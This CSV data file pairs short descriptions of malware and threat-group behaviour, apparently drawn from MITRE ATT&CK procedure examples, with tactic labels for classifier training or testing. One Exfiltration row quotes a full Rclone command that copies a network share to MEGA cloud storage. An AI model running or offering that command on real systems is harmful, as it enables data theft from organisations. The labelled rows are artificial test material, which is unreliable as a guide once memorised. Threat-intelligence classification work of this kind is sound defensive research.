text1,Tactic
Ursnif droppers have used COM properties to execute malware in hidden windows.,Defense Evasion
APT32 used NTFS alternate data streams to hide their payloads.,Defense Evasion
"BitPaymer has copied itself to the "":bin"" alternate data stream of a newly created file.",Defense Evasion
Expand can be used to download or copy a file into an alternate data stream.,Defense Evasion
Gazer stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.,Defense Evasion
LoJax has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.,Defense Evasion
PowerDuke hides many of its backdoor payloads in an alternate data stream (ADS).,Defense Evasion
Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes.,Defense Evasion
The Regin malware platform uses Extended Attributes to store encrypted executables.,Defense Evasion
Valak has the ability save and execute files as alternate data streams (ADS).,Defense Evasion
WastedLocker has the ability to save and execute files as an alternate data stream (ADS).,Defense Evasion
esentutl can be used to read and write alternate data streams.,Defense Evasion
BOOTRASH has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.,Defense Evasion
ComRAT has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.,Defense Evasion
Regin has used a hidden file system to store some of its components.,Defense Evasion
Strider has used a hidden file system that is stored as a file on disk.,Defense Evasion
"Ragnar Locker has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives.",Defense Evasion
"FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as “hacked,"" ""phish,"" and “malware"" in a likely attempt to prevent organizations from communicating about their activities.",Defense Evasion
Keydnap uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system.,Defense Evasion
"OSX/Shlayer has used a resource fork to hide a compressed binary file of itself from the terminal, Finder, and potentially evade traditional scanners.",Defense Evasion
Cobalt Strike can use spoof arguments in spawned processes that execute beacon commands.,Defense Evasion
SombRAT has the ability to modify its process memory to hide process command-line arguments.,Defense Evasion
Axiom has used spear phishing to initially compromise victims.,Initial Access
Dragonfly has used spearphising campaigns to gain access to victims.,Initial Access
Hikit has been spread through spear phishing.,Initial Access
APT-C-36 has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway.,Initial Access
APT1 has sent spearphishing emails containing malicious attachments.,Initial Access
APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments.,Initial Access
APT30 has used spearphishing emails with malicious DOC attachments.,Initial Access
APT32 has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.,Initial Access
APT37 delivers malware using spearphishing emails with malicious HWP attachments.,Initial Access
APT38 has conducted spearphishing campaigns using malicious email attachments.,Initial Access
APT39 leveraged spearphishing emails with malicious attachments to initially compromise victims.,Initial Access
APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.,Initial Access
Ajax Security Team has used personalized spearphishing attachments.,Initial Access
Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments.,Initial Access
BLINDINGCAN has been delivered by phishing emails containing malicious Microsoft Office documents.,Initial Access
BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims.,Initial Access
Bandook is delivered via a malicious Word document inside a zip file.,Initial Access
Bisonal has been delivered as malicious email attachments.,Initial Access
BlackTech has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware.,Initial Access
Bumblebee has gained execution through luring users into opening malicious attachments.,Initial Access
Chaes has been delivered by sending victims a phishing email containing a malicious .docx file.,Initial Access
"Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.",Initial Access
DanBot has been distributed within a malicious Excel attachment via spearphishing emails.,Initial Access
DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.,Initial Access
DarkWatchman has been delivered via spearphishing emails that contain a malicious zip file.,Initial Access
Dragonfly 2.0 used spearphishing with Microsoft Office attachments to target victims.,Initial Access
"During Operation Dust Storm, the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.",Initial Access
Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.,Initial Access
"Ember Bear has sent spearphishing emails containing malicious attachments in the form of PDFs, Word documents, JavaScript files, and Control Panel File (CPL) executables.",Initial Access
Emotet has been delivered by phishing emails containing attachments.,Initial Access
EnvyScout has been distributed via spearphishing as an email attachment.,Initial Access
FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.,Initial Access
FIN8 has distributed targeted emails containing Word documents with embedded malicious macros.,Initial Access
Ferocious Kitten has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.,Initial Access
Flagpro has been distributed via spearphishing as an email attachment.,Initial Access
"For C0015, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.",Initial Access
Frankenstein has used spearphishing emails to send trojanized Microsoft Word documents.,Initial Access
Gallmaker sent emails with malicious Microsoft Office documents attached.,Initial Access
Gamaredon Group has delivered spearphishing emails with malicious attachments to targets.,Initial Access
Gorgon Group sent emails to victims with malicious Microsoft Office documents attached.,Initial Access
Hancitor has been delivered via phishing emails with malicious attachments.,Initial Access
IcedID has been delivered via phishing e-mails with malicious attachments.,Initial Access
IndigoZebra sent spearphishing emails containing malicious password-protected RAR attachments.,Initial Access
JSS Loader has been delivered by phishing emails containing malicious Microsoft Excel attachments.,Initial Access
Javali has been delivered as malicious e-mail attachments.,Initial Access
KOCTOPUS has been distributed via spearphishing emails with malicious attachments.,Initial Access
Kerrdown has been distributed through malicious e-mail attachments.,Initial Access
"Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.",Initial Access
Lokibot is delivered via a malicious XLS attachment contained within a spearhpishing email.,Initial Access
Metamorfo has been delivered to victims via emails with malicious HTML attachments.,Initial Access
"Mofang delivered spearphishing emails with malicious documents, PDFs, or Excel files attached.",Initial Access
OceanSalt has been delivered via spearphishing emails with Microsoft Office attachments.,Initial Access
OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.,Initial Access
OutSteel has been distributed as a malicious attachment within a spearphishing email.,Initial Access
PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector.,Initial Access
Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims.,Initial Access
PoetRAT was distributed via malicious Word documents.,Initial Access
Pony has been delivered via spearphishing attachments.,Initial Access
ROKRAT has been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document.,Initial Access
RTM has been delivered via spearphishing attachments disguised as PDF documents.,Initial Access
RTM has used spearphishing attachments to distribute its malware.,Initial Access
Rancor has attached a malicious document to an email to gain initial access.,Initial Access
Rifdoor has been distributed in e-mails with malicious Excel or Word documents.,Initial Access
Sandworm Team has delivered malicious Microsoft Office attachments via spearphishing emails.,Initial Access
Sharpshooter has sent malicious attachments via emails to targets.,Initial Access
SideCopy has sent spearphishing emails with malicious hta file attachments.,Initial Access
"Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments.",Initial Access
Squirrelwaffle has been distributed via malicious Microsoft Office documents within spam emails.,Initial Access
TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments.,Initial Access
TA505 has used spearphishing emails with malicious attachments to initially compromise victims.,Initial Access
TA551 has sent spearphishing attachments with password protected ZIP files.,Initial Access
The White Company has sent phishing emails with malicious Microsoft Word attachments to victims.,Initial Access
ThreatNeedle has been distributed via a malicious Word document within a spearphishing email.,Initial Access
Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads.,Initial Access
TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware,Initial Access
Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.,Initial Access
Turla has used spearphishing emails to deliver BrainTest as a malicious attachment.,Initial Access
Valak has been delivered via spearphishing e-mails with password protected ZIP files.,Initial Access
Windshift has sent spearphishing emails with attachment to harvest credentials and deliver malware.,Initial Access
"Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar.",Initial Access
"ZxxZ has been distributed via spearphishing emails, usually containing a malicious RTF or Excel attachment.",Initial Access
admin@338 has sent emails with malicious Microsoft Office documents attached.,Initial Access
"AADInternals can send ""consent phishing"" emails containing malicious links designed to steal users’ access tokens.",Initial Access
APT28 sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.,Initial Access
APT39 leveraged spearphishing emails with malicious links to initially compromise victims.,Initial Access
AppleJeus has been distributed via spearphishing link.,Initial Access
Bazar has been spread via emails with embedded malicious links.,Initial Access
BlackTech has used spearphishing e-mails with links to cloud services to deliver malware.,Initial Access
Bumblebee has been spread through e-mail campaigns with malicious links.,Initial Access
Confucius has sent malicious links to victims through email campaigns.,Initial Access
Dragonfly 2.0 used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.,Initial Access
"During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India.",Initial Access
"During Night Dragon, threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.",Initial Access
"During Operation Dust Storm, the threat actors sent spearphishing emails containing a malicious link.",Initial Access
EXOTIC LILY has relied on victims to open malicious links in e-mails for execution.,Initial Access
Earth Lusca has sent spearphishing emails to potential targets that contained a malicious link.,Initial Access
Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.,Initial Access
Ember Bear has sent spearphishing emails containing malicious links.,Initial Access
FIN7 has conducted broad phishing campaigns using malicious links.,Initial Access
Hancitor has been delivered via phishing emails which contained malicious links.,Initial Access
Javali has been delivered via malicious links embedded in e-mails.,Initial Access
KOCTOPUS has been distributed as a malicious link within an email.,Initial Access
Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.,Initial Access
Lazarus Group has sent malicious links to victims via email.,Initial Access
LazyScripter has used spam emails that contain a link that redirects the victim to download a malicious document.,Initial Access
"Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",Initial Access
Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.,Initial Access
Melcoz has been spread through malicious links embedded in e-mails.,Initial Access
Mofang delivered spearphishing emails with malicious links included.,Initial Access
Night Dragon sent spearphishing emails containing links to compromised websites where malware was downloaded.,Initial Access
OutSteel has been distributed through malicious links contained within spearphishing emails.,Initial Access
QakBot has spread through emails with malicious links.,Initial Access
Saint Bot has been distributed through malicious links contained within spearphishing emails.,Initial Access
Sidewinder has sent e-mails with malicious links often crafted for specific targets.,Initial Access
Squirrelwaffle has been distributed through phishing emails containing a malicious URL.,Initial Access
Stolen Pencil sent spearphishing emails containing links to domains controlled by the threat actor.,Initial Access
TA505 has sent spearphishing emails containing malicious links.,Initial Access
TrickBot has been delivered via malicious links in phishing e-mails.,Initial Access
Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.,Initial Access
Windshift has sent spearphishing emails with links to harvest credentials and deliver malware.,Initial Access
ZIRCONIUM has used malicious links and web beacons in e-mails for malware download and to track hits to attacker-controlled URL's.,Initial Access
APT29 has used the legitimate mailing service Constant Contact to send phishing e-mails.,Initial Access
Ajax Security Team has used various social media channels to spearphish victims.,Initial Access
FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets.,Initial Access
Lazarus Group has used fake job advertisements sent via LinkedIn to spearphish victims.,Initial Access
"Lazarus Group has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.",Initial Access
Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.,Initial Access
OilRig has used LinkedIn to send spearphishing links.,Initial Access
APT28 can exfiltrate data over Google Drive.,Exfiltration
AppleSeed has exfiltrated files using web services.,Exfiltration
DropBook has used legitimate web services to exfiltrate data.,Exfiltration
BoomBox can upload data to dedicated per-victim folders in Dropbox.,Exfiltration
Chimera has exfiltrated stolen data to OneDrive accounts.,Exfiltration
Clambling can send files from a victim's machine to Dropbox.,Exfiltration
Confucius has exfiltrated victim data to cloud storage service accounts.,Exfiltration
CreepyDrive can use cloud services including OneDrive for data exfiltration.,Exfiltration
"During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command `rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.",Exfiltration
Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA.,Exfiltration
Empire can use Dropbox for data exfiltration.,Exfiltration
FIN7 has exfiltrated stolen data to the MEGA file sharing site.,Exfiltration
"HEXANE has used cloud services, including OneDrive, for data exfiltration.",Exfiltration
Lazarus Group has exfiltrated stolen data to Dropbox using a customized version of dbxcli.,Exfiltration
Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.,Exfiltration
POLONIUM has exfiltrated stolen data to POLONIUM-owned OneDrive and Dropbox accounts.,Exfiltration
ROKRAT can send collected data to cloud storage services such as PCloud.,Exfiltration
RainyDay can use a file exfiltration tool to upload specific files to Dropbox.,Exfiltration
"Rclone can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.",Exfiltration
Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared.,Exfiltration
ZIRCONIUM has exfiltrated stolen data to Dropbox.,Exfiltration
APT32 has deployed tools after moving laterally using administrative accounts.,Lateral Movement
Aoqin Dragon has spread malware in target networks by copying modules to folders masquerading as removable devices.,Lateral Movement
BITSAdmin can be used to create BITS Jobs to upload and/or download files from SMB file servers.,Lateral Movement
Chimera has copied tools between compromised hosts using SMB.,Lateral Movement
"During C0015, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network.",Lateral Movement
DustySky searches for network drives and removable media and duplicates itself onto them.,Lateral Movement
Expand can be used to download or upload a file over a network share.,Lateral Movement
FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.,Lateral Movement
GALLIUM has used PsExec to move laterally between hosts in the target network.,Lateral Movement
HermeticWizard can copy files to other machines on a compromised network.,Lateral Movement
Kerrdown can download additional software including Cobalt Strike from servers on the victim's network.,Lateral Movement
"LockerGoga has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.",Lateral Movement
Olympic Destroyer attempts to copy itself to remote machines on the network.,Lateral Movement
Operation Wocao has used SMB to copy files to and from target systems.,Lateral Movement
PsExec can be used to download or upload a file over a network share.,Lateral Movement
Sandworm Team has used `move` to transfer files to a network share.,Lateral Movement
Shamoon attempts to copy itself to remote machines on the network.,Lateral Movement
Stuxnet uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.,Lateral Movement
Turla RPC backdoors can be used to transfer files to/from victim machines on the local network.,Lateral Movement
WannaCry attempts to copy itself to remote computers after gaining access via an SMB exploit.,Lateral Movement
"Wizard Spider has used stolen credentials to copy tools into the ""%TEMP%"" directory of domain controllers.",Lateral Movement
cmd can be used to copy files to/from a remotely connected internal system.,Lateral Movement
esentutl can be used to copy files to/from a remote share.,Lateral Movement
ftp may be abused by adversaries to transfer tools or files between systems within a compromised environment.,Lateral Movement
Cobalt Group has used the Plink utility to create SSH tunnels.,Command and Control
FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.,Command and Control
APT29 has used multiple layers of encryption within malware to protect C2 communication.,Command and Control
BITTER has encrypted their C2 communications.,Command and Control
Cryptoistic can engage in encrypted communications with C2.,Command and Control
Lizar can support encrypted communications between the client and server.,Command and Control
NETWIRE can encrypt C2 communications.,Command and Control
PowGoop can receive encrypted commands from C2.,Command and Control
PowerLess can use an encrypted channel for C2 communications.,Command and Control
RCSession can use an encrypted beacon to check in with C2.,Command and Control
Tropic Trooper has encrypted traffic with the C2 to prevent network detection.,Command and Control
gh0st RAT has encrypted TCP communications to evade detection.,Command and Control
A variant of ADVSTORESHELL encrypts some C2 with 3DES.,Command and Control
"APT12 has used the RIPTIDE RAT, which communicates over HTTP with a payload encrypted with RC4.",Command and Control
APT28 installed a Delphi backdoor that used a custom algorithm for C2 communications.,Command and Control
APT33 has used AES for encryption of command and control traffic.,Command and Control
Attor has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.,Command and Control
Azorult can encrypt C2 traffic using XOR.,Command and Control
BADCALL encrypts C2 traffic using an XOR/ADD cipher.,Command and Control
BADNEWS encrypts C2 data with a ROR by 3 and an XOR by 0x23.,Command and Control
BBSRAT uses a custom encryption algorithm on data sent back to the C2 server over HTTP.,Command and Control
BLINDINGCAN has encrypted its C2 traffic with RC4.,Command and Control
BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.,Command and Control
Bandook has used AES encryption for C2 communication.,Command and Control
Bazar can send C2 communications with XOR encryption.,Command and Control
"Before being appended to image files, HAMMERTOSS commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.",Command and Control
Bisonal variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some Bisonal samples encrypt C2 communications with RC4.,Command and Control
Bonadan can XOR-encrypt C2 communications.,Command and Control
Bumblebee can encrypt C2 requests and responses with RC4,Command and Control
CHOPSTICK encrypts C2 communications with RC4.,Command and Control
CORESHELL C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.,Command and Control
CallMe uses AES to encrypt C2 traffic.,Command and Control
Carbanak encrypts the message body of HTTP traffic with RC2 (in CBC mode). Carbanak also uses XOR with random keys for its communications.,Command and Control
ChChes can encrypt C2 traffic with AES or RC4.,Command and Control
Cobalt Strike has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.,Command and Control
Comnie encrypts command and control communications with RC4.,Command and Control
CosmicDuke contains a custom version of the RC4 algorithm that includes a programming error.,Command and Control
Darkhotel has used AES-256 and 3DES for C2 communications.,Command and Control
Dipsind encrypts C2 data with AES256 in ECB mode.,Command and Control
Dridex has encrypted traffic with RC4.,Command and Control
"During Frankenstein, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.",Command and Control
"Ebury has encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string.",Command and Control
Elise encrypts exfiltrated data with RC4.,Command and Control
Epic encrypts commands from the C2 server using a hardcoded key.,Command and Control
FALLCHILL encrypts C2 data with RC4 encryption.,Command and Control
FatDuke can AES encrypt C2 communications.,Command and Control
FlawedAmmyy has used SEAL encryption during the initial C2 handshake.,Command and Control
FoggyWeb has used a dynamic XOR key and custom XOR methodology for C2 communications.,Command and Control
Frankenstein has communicated with a C2 via an encrypted RC4 byte stream and AES-CBC.,Command and Control
Gazer uses custom encryption for C2 that uses 3DES.,Command and Control
GreyEnergy encrypts communications using AES256.,Command and Control
GrimAgent can use an AES key to encrypt C2 communications.,Command and Control
H1N1 encrypts C2 traffic using an RC4 key.,Command and Control
Helminth encrypts data sent to its C2 server over HTTP with RC4.,Command and Control
HiddenWasp uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.,Command and Control
Higaisa used AES-128 to encrypt C2 traffic.,Command and Control
Hikit performs XOR encryption.,Command and Control
HyperStack has used RSA encryption for C2 communications.,Command and Control
KEYMARBLE uses a customized XOR algorithm to encrypt C2 communications.,Command and Control
Kobalos's post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic.,Command and Control
LightNeuron uses AES to encrypt C2 traffic.,Command and Control
LookBack uses a modified version of RC4 for data transfer.,Command and Control
Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.,Command and Control
Lurid performs XOR encryption.,Command and Control
Machete has used AES to exfiltrate documents.,Command and Control
Metamorfo has encrypted C2 commands with AES-256.,Command and Control
More_eggs has used an RC4-based encryption method for its C2 communications.,Command and Control
"Mosquito uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.",Command and Control
MuddyWater has used AES to encrypt C2 responses.,Command and Control
Mustang Panda has encrypted C2 communications with RC4.,Command and Control
NDiskMonitor uses AES to encrypt certain information sent over its C2 channel.,Command and Control
"NETEAGLE will decrypt resources it downloads with HTTP requests by using RC4 with the key ""ScoutEagle.""",Command and Control
NETWIRE can use AES encryption for C2 data transferred.,Command and Control
NanoCore uses DES to encrypt the C2 traffic.,Command and Control
PLAINTEE encodes C2 beacons using XOR.,Command and Control
PLEAD has used RC4 encryption to download modules.,Command and Control
POWERTON has used AES for encrypting C2 traffic.,Command and Control
Pandora has the ability to encrypt communications with D3DES.,Command and Control
"PingPull can use AES, in cipher block chaining (CBC) mode padded with PKCS5, to encrypt C2 server communications.",Command and Control
PlugX can use RC4 encryption in C2 communications.,Command and Control
PoisonIvy uses the Camellia cipher to encrypt communications.,Command and Control
Prikormka encrypts some C2 traffic with the Blowfish cipher.,Command and Control
QuasarRAT uses AES with a hardcoded pre-shared key to encrypt network communication.,Command and Control
RDAT has used AES ciphertext to encode C2 communications.,Command and Control
RainyDay can use RC4 to encrypt C2 communications.,Command and Control
Rifdoor has encrypted command and control (C2) communications with a stream cipher.,Command and Control
SeaDuke C2 traffic has been encrypted with RC4 and AES.,Command and Control
Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads. Lazarus Group has also used AES to encrypt C2 traffic.,Command and Control
SideTwist can encrypt C2 communications with a randomly generated key.,Command and Control
Sliver can use AES-GCM-256 to encrypt a session key for C2 message exchange.,Command and Control
SodaMaster can use RC4 to encrypt C2 communications.,Command and Control
SombRAT has encrypted its C2 communications with AES.,Command and Control
Some Felismus samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.,Command and Control
Some versions of UPPERCUT have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.,Command and Control
Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key.,Command and Control
StrifeWater can encrypt C2 traffic using XOR with a hard coded key.,Command and Control
Stuxnet encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key. Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant.,Command and Control
Sys10 uses an XOR 0x1 loop to encrypt its C2 domain.,Command and Control
TAINTEDSCRIBE uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.,Command and Control
TSCookie has encrypted network communications with RC4.,Command and Control
Taidoor uses RC4 to encrypt the message body of HTTP content.,Command and Control
The Duqu command and control protocol's data stream can be encrypted with AES-CBC.,Command and Control
The IceApple Result Retriever module can AES encrypt C2 responses.,Command and Control
The original variant of FakeM encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation. Some variants of FakeM use RC4 to encrypt C2 traffic.,Command and Control
Volgmer uses a simple XOR cipher to encrypt traffic and files.,Command and Control
WarzoneRAT can encrypt its C2 with RC4 with the password `warzone160\x00`.,Command and Control
Winnti for Linux has used a custom TCP protocol with four-byte XOR for command and control (C2).,Command and Control
Winnti for Windows can XOR encrypt C2 traffic.,Command and Control
XCSSET uses RC4 encryption over TCP to communicate with its C2 server.,Command and Control
ZeroT has used RC4 to encrypt C2 traffic.,Command and Control
down_new has the ability to AES encrypt C2 communications.,Command and Control
gh0st RAT uses RC4 and XOR to encrypt C2 traffic.,Command and Control
"httpclient encrypts C2 content with XOR using a single byte, 0x12.",Command and Control
xCaon has encrypted data sent to the C2 server using a XOR key.,Command and Control
Attor's Blowfish key is encrypted with a public RSA key.,Command and Control
BISCUIT uses SSL for encrypting C2 communications.,Command and Control
Bazar can use TLS in C2 communications.,Command and Control
CHOPSTICK encrypts C2 communications with TLS.,Command and Control
Cobalt Strike can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.,Command and Control
DarkWatchman can use TLS to encrypt its C2 channel.,Command and Control
Dridex has encrypted traffic with RSA.,Command and Control
"During Operation Wocao, threat actors' proxy implementation ""Agent"" upgraded the socket in use to a TLS socket.",Command and Control
Empire can use TLS to encrypt its C2 channel.,Command and Control
FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure.,Command and Control
GoldMax has RSA-encrypted its communication with the C2 server.,Command and Control
GreyEnergy encrypts communications using RSA-2048.,Command and Control
GrimAgent can use a hardcoded server public RSA key to encrypt the first request to C2.,Command and Control
Hi-Zor encrypts C2 traffic with TLS.,Command and Control
IcedID has used SSL and TLS in communications with C2.,Command and Control
Kobalos's authentication and key exchange is performed using RSA-512.,Command and Control
Machete has used TLS-encrypted FTP to exfiltrate data.,Command and Control
Metamorfo's C2 communication has been encrypted using OpenSSL.,Command and Control
OilRig used the Plink utility and other tools to create tunnels to C2 servers.,Command and Control
POSHSPY encrypts C2 traffic with AES and RSA.,Command and Control
POWERSTATS has encrypted C2 traffic with RSA.,Command and Control
Pay2Key has used RSA encrypted communications with C2.,Command and Control
Penquin can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.,Command and Control
PoetRAT used TLS to encrypt command and control (C2) communications.,Command and Control
"Pupy's default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.",Command and Control
REvil has encrypted C2 communications with the ECIES algorithm.,Command and Control
Rising Sun variants can use SSL for encrypting C2 communications.,Command and Control
Sliver can use mutual TLS and RSA  cryptography to exchange a session key.,Command and Control
Small Sieve can use SSL/TLS for its HTTPS Telegram Bot API-based C2 channel.,Command and Control
SombRAT can SSL encrypt C2 traffic.,Command and Control
Some Volgmer variants use SSL to encrypt C2 communications.,Command and Control
StrongPity has encrypted C2 traffic using SSL/TLS.,Command and Control
Sykipot uses SSL for encrypting C2 communications.,Command and Control
TinyTurla has the ability to encrypt C2 traffic with SSL/TLS.,Command and Control
Trojan.Karagany can secure C2 communications with SSL and TLS.,Command and Control
Tropic Trooper has used SSL to connect to C2 servers.,Command and Control
WannaCry uses Tor for command and control traffic and routes a custom cryptographic protocol over the Tor circuit.,Command and Control
WellMail can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.,Command and Control
WellMess can communicate to C2 with mutual TLS where client and server mutually check certificates.,Command and Control
XTunnel uses SSL/TLS and RC4 to encrypt traffic.,Command and Control
Zebrocy uses SSL and AES ECB for encrypting C2 communications.,Command and Control
adbupd contains a copy of the OpenSSL library to encrypt C2 traffic.,Command and Control
ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.,Persistence
A FinFisher variant uses DLL search order hijacking.,Persistence
"APT41 has used search order hijacking to execute malicious payloads, such as Winnti RAT.",Persistence
"Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.",Persistence
Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.,Persistence
Empire contains modules that can discover and exploit various DLL hijacking opportunities.,Persistence
FoggyWeb's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate `version.dll` during the `Microsoft.IdentityServer.ServiceHost.exe` execution process.,Persistence
"Hikit has used DLL Search Order Hijacking to load ""oci.dll"" as a persistence mechanism.",Persistence
